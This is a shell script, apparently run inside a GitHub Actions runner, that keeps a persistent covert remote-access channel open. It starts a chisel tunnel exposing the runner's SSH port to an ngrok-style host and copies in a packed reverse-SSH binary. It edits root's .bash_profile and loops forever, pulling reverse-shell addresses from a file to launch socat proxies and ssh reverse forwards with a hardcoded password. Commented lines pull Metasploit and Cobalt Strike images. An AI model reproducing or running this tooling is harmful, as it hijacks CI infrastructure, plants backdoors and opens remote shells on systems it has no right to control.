# /home/runner/work/nc_test/nc_test/socat.bin -h
# proxy:<proxy-server>:<host>:<port>
#github cd/ci
#/home/runner/work/nc_test/nc_test/socat.bin -v  TCP4-LISTEN:50022,reuseaddr,fork  proxy:node4.buuoj.cn:127.0.0.1:2244,proxyport=29904 &

# curl -o /dev/null -s -w "http_code %{http_code}\ntime_namelookup %{time_namelookup}\ntime_connect %{time_connect}\ntime_starttransfer %{time_starttransfer}\ntime_total %{time_total}" "http://www.qq.com"

#setsid docker pull  metasploitframework/metasploit-framework &
#setsid docker pull   idoall/ubuntu16.04-sshd &
#setsid docker pull  xrsec/cobaltstrike &
#setsid docker pull  couchbase/centos7-systemd  &  
#setsid docker pull centos:centos7  &

cd /tmp;
cp /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin . &
cp /home/runner/work/nc_test/nc_test/busybox.bin  . &


url2024a="zpcyc3ytxvm4.ngrok.xiaomiqiu123.top" #--keepalive 10s --sni "download.cloud.189.cn"
setsid /home/runner/work/nc_test/nc_test/chisel2upx.elf client -v --keepalive 10s --header "User-Agent: curl/7.87.0" --hostname "$url2024a" "http://${url2024a}/" R:127.0.0.1:50057:127.0.0.1:22 &


sudo bash -c 'ln -s /bin/bash /bin/idn;echo -e "\nls -al /tmp/nu*;echo 中文模式 ;">>/root/.bash_profile';



# [ "715" == "715" ]  && sleep 1;

[ -z "${GITHUB_WORKSPACE}" ]  && (
  sleep 2
)||(
  echo 234691
  );


 [  -z "${GITHUB_WORKSPACE}" ] &&echo 13734||(
  cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
   mkdir -pv  $GITHUB_WORKSPACE/package;
   mkdir -pv  $GITHUB_WORKSPACE/dist;
   id>$GITHUB_WORKSPACE/package/d2023.txt;
   uptime>$GITHUB_WORKSPACE/d2023.txt;
  #date>$GITHUB_WORKSPACE/dist/d2023.txt;
 )


[ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;

#ip_port7pxy2=$(echo "$PATH");
#ip_port7pxy2qw3=$(echo 123;echo "$PATH"; ls -al aaau 2>&1 >/dev/null;echo 4568;);

ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456814; );
echo "flag_9832q $ip_port7pxy2a";


# (
#   setsid sleep 10m &
#   setsid sleep 2h &
#   setsid sleep 4h &
# )&

# (
#   while true; do
#   date;
#   sleep 59;
#   done
#   setsid sleep 3h &
# )&



(while true; do
        [ ! -f /tmp/keepalive ] && break        
         num61z=$(date +%S);
         num67z=$(echo "1"$num61z);
         num76=$((${num67z}%8));
         bport=5005"$num76";echo $bport >> /tmp/keepalive;
# 提取反弹upxSSH的主机和端口
ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9;echo 456891 >/dev/null)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};
# 提取反弹socat的主机和端口，支持代理(ip7)
ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456891 >/dev/null);
echo "flag_9832";
port7pxy=${ip_port7pxy#*:};
ip7pxy=${ip_port7pxy%:*};
echo "flag 1122334";

if [ ! -z ${port7pxy} ] && [ ! -z ${ip7pxy} ]; then
  setsid /home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7pxy}:127.0.0.1:2244,proxyport=${port7pxy}  &
  # 基本不用
  (
  (ps aux|grep -v grep|grep "40022:127.0.0.1:22")&& echo 40022_ok ||(sleep 1;
    (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:22   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
    (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z51194
  )
  )&

  # 基本不用 反弹1194给远端
  (
  (ps aux|grep -v grep|grep "51194:127.0.0.1:1194")&& echo 51194_ok ||(sleep 1;
    (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:22   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
    (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z40022
  )
  )&

fi


if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
  #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
  #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
   #[ ! -z ${GITHUB_WORKSPACE} ] &&
   #(
      echo "exit_revSSH_isOK ${ip5} : ${port5}  -> $bport ";
      sleep 60;
      #[ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&(sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5;echo \$?;");echo $?;      
   #)||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
  echo "exit_revSSH_isOK_$bport";
fi


echo "will sleep 12s for while true";
date;
sleep 12; 

done) &

